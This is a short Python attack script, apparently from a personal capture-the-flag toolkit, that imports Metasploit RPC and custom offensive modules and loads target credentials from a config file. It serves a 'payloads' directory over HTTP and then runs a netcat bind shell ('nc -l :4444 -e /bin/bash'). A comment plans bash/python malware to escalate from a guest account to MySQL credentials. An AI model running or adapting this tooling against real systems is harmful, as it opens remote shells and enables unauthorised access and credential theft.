from computerspeak import ComputerSpeak as cs
from pymetasploit3.msfrpc import MsfRpcClient
from metasploiting import search_modules, execute_module, list_sessions, get_db_status, payload_generation
from netrunning import NetRunning as nr
from whatprocess import WhatProcess as wp
from fileshuttle import FileShuttle as fs
from enumeration import FileCrawler as fc
from shellwalking import ShellWalker as sw
from catchingpackets import PacketSniffer as ps
from target_config import MSF_PASS, TARGET_IP, TARGET_INTERFACE, TARGET_USERNAME, TARGET_PASSWORD, TARGET_RANGE, SELF_IP_RE, IPV4_RE, WORDLIST_PATH
from conquer import Tenfold as tf
from orchestrator import Orchestrator as Or
from dacore import CoreClass as cc
import re
import time
from publicface import publicface as Pf

def somerandomcode1():

    pfi = Pf()
    cci = cc()
    psi = ps()
    swi = sw()
    fci = fc()
    wpi = wp()
    nri = nr()
    csi = cs()
    tfi = tf()
    ori = Or()

    ###so it turns out you can in fact LOTL in Marlin, executing with noexec is totally possible, in both python and bash. 
    # I've saved a snapshot of exactly how it is right now, and ill be writing bash/python malware to explore 
    # this further. The next steps will be to write a python script that will execute a payload on the guest 
    # account, and then use that to get the tmp account password, and then use that to get the mysql credentials, 
    # and then use those to get the mysql database, and then use that to get the flag.
    
    print("[*] Is it someone new?")
    nri.stop_server()
    nri.create_server("payloads", 8000)
    time.sleep(60)
    csi.speak("Executing payload on target machine...")
    csi.execute_command("nc -l :4444 -e /bin/bash")

    

if __name__ == "__main__":  
    somerandomcode1()